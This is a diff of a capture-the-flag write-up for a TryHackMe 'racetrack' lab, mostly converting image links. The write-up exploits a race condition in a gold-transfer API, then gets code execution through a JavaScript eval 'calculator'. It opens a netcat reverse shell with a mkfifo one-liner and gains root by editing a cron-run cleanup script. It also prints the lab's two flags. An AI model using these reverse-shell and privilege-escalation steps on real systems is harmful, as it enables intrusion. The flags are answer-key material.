@@ -18,7 +18,7 @@ sticker: emoji//1f3e6
 
 Let's check the web application:
 
-![[Pasted image 20250612145657.png]]
+![](../images/Pasted%20image%2020250612145657.png)
 
 We can create an account and login, let's fuzz to check more hidden directories:
 
@@ -66,29 +66,29 @@ Create.html             [Status: 200, Size: 1973, Words: 620, Lines: 59, Duratio
 
 We got a bunch of stuff, `giving.html` is interesting, let's create a test account first:
 
-![[Pasted image 20250612150609.png]]
+![](../images/Pasted%20image%2020250612150609.png)
 
-![[Pasted image 20250612151210.png]]
+![](../images/Pasted%20image%2020250612151210.png)
 
 We got a purchase functionality on here too, we can check it out:
 
-![[Pasted image 20250612151246.png]]
+![](../images/Pasted%20image%2020250612151246.png)
 
  We can buy a premium account with `10000` gold, we are only given `1 gold` when we create an account though, that's because there's a `give gold` functionality, if we check it, we can see this:
 
-![[Pasted image 20250612151403.png]]
+![](../images/Pasted%20image%2020250612151403.png)
 
 We can give gold to our friends simply by knowing their username, based on that, let's create another account and give ourselves one gold:
 
-![[Pasted image 20250612151455.png]]
+![](../images/Pasted%20image%2020250612151455.png)
 
-![[Pasted image 20250612151516.png]]
+![](../images/Pasted%20image%2020250612151516.png)
 
-![[Pasted image 20250612151528.png]]
+![](../images/Pasted%20image%2020250612151528.png)
 
 If we check our first account:
 
-![[Pasted image 20250612151603.png]]
+![](../images/Pasted%20image%2020250612151603.png)
 
 As seen, we receive the gold, on this case, to reach `10000` gold we'd need to create 10000 accounts, which is simply ridiculous, we can automate it with python but on a real server, 10000 accounts coming from a single IP would be suspicious and would end up getting ourselves banned.
 
@@ -98,7 +98,7 @@ That's why, we need another path, I'd try to go with `race condition`, A race co
 
 But, we are a bit lost, we don't know how to exploit this race condition yet, let's pass the request to our proxy.
 
-![[Pasted image 20250612152318.png]]
+![](../images/Pasted%20image%2020250612152318.png)
 
 Ok, we got a bit more information, most relevant one is the:
 
@@ -110,12 +110,12 @@ Seeing the header `X-Powered-By: Express` in a response means the web server is 
 
 Since the application's named `racetrack`, we can search for something related:
 
-![[Pasted image 20250612152600.png]]
+![](../images/Pasted%20image%2020250612152600.png)
 
 As seen, there's only race conditions for this, if we investigate further, we can find the package too:
 
 
-![[Pasted image 20250612152928.png]]
+![](../images/Pasted%20image%2020250612152928.png)
 
 
 
@@ -125,7 +125,7 @@ As seen, there's only race conditions for this, if we investigate further, we ca
 
 If we go back to the proxy, we can check the format of the request:
 
-![[Pasted image 20250612153022.png]]
+![](../images/Pasted%20image%2020250612153022.png)
 
 As seen, we need the cookie of our user, the amount and the username of the account who's receiving the gold, we can exploit the race condition using a fuzzer such as `wfuzz` or `ffuf` in this case, get the `cookie`, we also need to create a wordlist in which `1` is repeated a bunch of times, let's do it, you can use the following bash command:
 
@@ -140,11 +140,11 @@ ffuf -c -u http://racetrack.thm/api/givegold -X POST -w race_wordlist.txt -H "Co
 ```
 
 
-![[Pasted image 20250612153415.png]]
+![](../images/Pasted%20image%2020250612153415.png)
 
 We will see all the requests being made, what we need to do now is check `test2` account:
 
-![[Pasted image 20250612153459.png]]
+![](../images/Pasted%20image%2020250612153459.png)
 
 As seen, we receive more gold that we have on our `test` account, the race condition exists and is exploitable, we can perform the same ffuf increasing the gold amount we are sending to a further quantity or, simply automate the deed with python as we usually do:
 
@@ -307,24 +307,24 @@ Target balance: 10,000 gold
 🎉 Exploit successful! Final balance: 20800 gold
 ```
 
-![[Pasted image 20250612155205.png]]
+![](../images/Pasted%20image%2020250612155205.png)
 
 We need to check `acc2`:
 
-![[Pasted image 20250612155224.png]]
+![](../images/Pasted%20image%2020250612155224.png)
 
 As seen, we got the amount of gold the script told us, let's buy our premium account:
 
-![[Pasted image 20250612155301.png]]
+![](../images/Pasted%20image%2020250612155301.png)
 
 Once we buy it, we get access to `Premium Features`, let's check them out:
 
-![[Pasted image 20250612155322.png]]
+![](../images/Pasted%20image%2020250612155322.png)
 
 A calculator huh, seems weird:
 
 
-![[Pasted image 20250612161556.png]]
+![](../images/Pasted%20image%2020250612161556.png)
 
 As seen, the URL takes the format of:
 
@@ -340,7 +340,7 @@ process.cwd()
 
 This command checks the current working directory, once we use it we get:
 
-![[Pasted image 20250612162032.png]]
+![](../images/Pasted%20image%2020250612162032.png)
 
 As seen, we have RCE, we can use more commands to test:
 
@@ -364,7 +364,7 @@ Ok, the nice part about this is getting a reverse shell, so let's use:
 require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 9001 >/tmp/f')
 ```
 
-![[Pasted image 20250612162333.png]]
+![](../images/Pasted%20image%2020250612162333.png)
 
 Got our shell, let's begin privesc.
 
@@ -386,14 +386,14 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![[Pasted image 20250612162428.png]]
+![](../images/Pasted%20image%2020250612162428.png)
 Now, let's take a look around, we can use linpeas:
 
-![[Pasted image 20250612162926.png]]
+![](../images/Pasted%20image%2020250612162926.png)
 
 As seen, there's a `cleanupscript.sh` script, since it is a cleanup script, it may be running as a process each couple minutes, let's use `pspy` to check:
 
-![[Pasted image 20250612163145.png]]
+![](../images/Pasted%20image%2020250612163145.png)
 
 As expected, there's a cronjob which runs the `cleanupscript.sh` as root, we can make a backup of the real script and modify it to send ourselves a reverse shell:
 
@@ -407,7 +407,7 @@ chmod +x cleanupscript.sh
 
 Now, once we've saved the file, we need to set up our listener and wait a couple minutes:
 
-![[Pasted image 20250612164012.png]]
+![](../images/Pasted%20image%2020250612164012.png)
 
 We can now read both flags:
 
@@ -419,5 +419,5 @@ THM{178c31090a7e0f69560730ad21d90e70}
 THM{55a9d6099933f6c456ccb2711b8766e3}
 ```
 
-![[Pasted image 20250612164116.png]]
+![](../images/Pasted%20image%2020250612164116.png)
 
